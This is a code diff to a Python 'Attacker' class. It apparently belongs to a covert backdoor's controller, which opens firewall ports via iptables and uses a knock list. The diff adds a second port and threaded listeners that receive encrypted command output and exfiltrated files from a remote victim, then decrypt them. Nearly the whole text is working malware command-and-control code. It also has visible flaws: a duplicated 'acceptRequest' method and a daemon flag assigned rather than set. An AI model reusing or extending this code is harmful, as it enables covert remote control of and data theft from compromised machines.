@@ -20,10 +20,11 @@ result stored in tcp payload
 
 class Attacker(object):
 
-    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList, ttl):
+    def __init__(self, lhost, lport, lisport, fport, rhost, rport, proto, password, kList, ttl):
         self.localIP = lhost
         self.localPort = int(lport)
         self.listenPort = int(lisport)
+        self.filePort = int(fport)
         self.remoteIP = rhost
         self.remotePort = int(rport)
         self.protocol = proto.upper()
@@ -132,16 +133,34 @@ class Attacker(object):
 
     def acceptRequest(self):
         iptablesManager.run(self.protocol, self.remoteIP, str(self.listenPort), self.ttl)
+        iptablesManager.run(self.protocol, self.remoteIP, str(self.filePort), self.ttl)
 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-
-        hostIP = socket.gethostbyname(socket.gethostname())
-
-        sock.bind((hostIP, self.listenPort))
+    def stringServer(self, host, port):
+        sock = helpers.createSocket()
+        sock.bind((host, port))
 
         sock.listen(1)
-        print("Ready to receive on port %d..." % self.listenPort)
+        print("Ready to receive on port %d..." % port)
+        conn, addr = sock.accept()
+        data = ""
+        while True:
+            buff = conn.recv(BUFSIZE)
+
+            if buff.endswith(b'EOF'):
+                data += buff[:-3]
+                break
+
+            data += buff
+        conn.close()
+        result = encryption.decrypt(data)
+        print("Result: %s" % result)
+
+    def fileServer(self, host, port):
+        sock = helpers.createSocket()
+        sock.bind((host, port))
+
+        sock.listen(1)
+        print("Ready to receive on port %d..." % port)
         conn, addr = sock.accept()
         print("Receive connection from {}".format(addr))
 
@@ -160,3 +179,16 @@ class Attacker(object):
         encryption.decryptFile(dummyFile)
         os.remove(dummyFile)
         print("Done receiving!")
+
+    def acceptRequest(self):
+        iptablesManager.run(self.protocol, self.remoteIP, str(self.listenPort), self.ttl)
+        iptablesManager.run(self.protocol, self.remoteIP, str(self.filePort), self.ttl)
+        hostIP = socket.gethostbyname(socket.gethostname())
+
+        stringServer_thread = threading.Thread(target=self.stringServer, args=(hostIP, self.listenPort))
+        stringServer_thread.setDaemon = True
+        stringServer_thread.start()
+
+        fileServer_thread = threading.Thread(target=self.fileServer, args=(hostIP, self.filePort))
+        fileServer_thread.setDaemon = True
+        fileServer_thread.start()
